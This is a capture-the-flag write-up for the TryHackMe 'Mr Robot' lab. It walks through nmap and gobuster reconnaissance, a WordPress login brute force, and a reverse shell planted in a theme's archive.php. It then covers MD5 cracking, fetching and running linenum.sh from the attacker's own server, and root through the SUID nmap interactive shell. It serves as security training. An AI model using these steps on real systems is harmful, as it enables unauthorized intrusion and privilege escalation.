# Mr Robot CTF Try Hack Me 


> scan with `nmap -sC -sV 10.10.171.29 > nmap_log`
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 09:49 WIB
Nmap scan report for 10.10.171.29
Host is up (0.37s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 356.67 seconds
```

> check file robots.txt `http://10.10.171.29/robots.txt`
```js
User-agent: *
fsocity.dic
key-1-of-3.txt
```
> open `http://10.10.171.29/key-1-of-3.txt` got the first key `0xxx0xxxaxxx1xxxdxxx4xxxbxx7xxx9`
> download fsocity.dic `http://10.10.171.29/fsocity.dic`

> using gobuster and get wordpress login `wp-login`
> create Brute Login to `wp-login.php` using python and dictionary file
> after got username and password login to `wp-login`
> edit file on dashboard `archive.php` to reverse shell and access `http://10.10.171.29/wp-content/themes/twentyfifteen/archive.php`
> after got the shell look at `/home/robot`
```bash
daemon@linux:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt 
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

> crack the `c3fcd3d76192e4007dfb496cca67e13b` result is `axxxexxxixxxmxxxqxxxuxxxyz`
> using that password go to robot using su

```bash
daemon@linux:/home/robot$ su robot
Password: 
robot@linux:~$ cat key-2-of-3.txt 
8xxx7xxx6xxxfxxx9xxxexxxexxxfxxx
```

> open our connection using `python -m http.server 81`  in my case i open port 81 and my ip `10.4.37.160:81` and cd to `/dev/shm`

```bash
robot@linux:/dev/shm$ wget http://10.4.37.160:81/linenum.sh
wget http://10.4.37.160:81/linenum.sh
--2023-10-12 04:32:43--  http://10.4.37.160:81/linenum.sh
Connecting to 10.4.37.160:81... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [application/x-sh]
Saving to: ‘linenum.sh’

100%[======================================>] 46,631      54.4KB/s   in 0.8s   

2023-10-12 04:32:44 (54.4 KB/s) - ‘linenum.sh’ saved [46631/46631]

robot@linux:/dev/shm$ chmod +x linenum.sh
chmod +x linenum.sh

robot@linux:/dev/shm$ ./linenum.sh
./linenum.sh

.... a lot of bunch output from linenum 
....
[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
....
.... a lot of bunch output from linenum 
```

> use that interesting SUID files to check on GtfoBin and use that to privesc

# Priviledge Escalation
```sh
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
firstboot_done	key-3-of-3.txt
# ls -la
ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat firstboot_done
cat firstboot_done
# cat key-3-of-3.txt
cat key-3-of-3.txt
0xxx7xxxfxxx3xxx1xxx6xxx1xxxbxxx
```

> and ... yay!  we solved that challl....